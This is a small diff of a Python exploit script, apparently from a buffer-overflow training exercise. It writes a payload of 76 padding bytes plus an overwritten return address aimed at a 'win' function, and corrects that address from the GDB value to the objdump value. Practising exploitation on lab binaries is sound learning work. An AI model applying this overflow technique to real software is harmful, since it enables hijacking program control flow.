@@ -1,6 +1,5 @@
 #!/usr/bin/python
-# GDB reports win located at 0x80483fa
-
+# objdump reports 080483f4, exploit works in GDB, but segfault keeps python from printing result
 
 import commands
 
@@ -13,7 +12,7 @@ pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2
 
 # Create new file write buffer to file
 file = open('buffer', 'w+')
-buffer = 'A'*76 + '\xfa\x83\x04\x08' # Doesn't work yet
+buffer = 'A'*76 + '\xf4\x83\x04\x08'
 file.write(buffer)
 file.close()
 
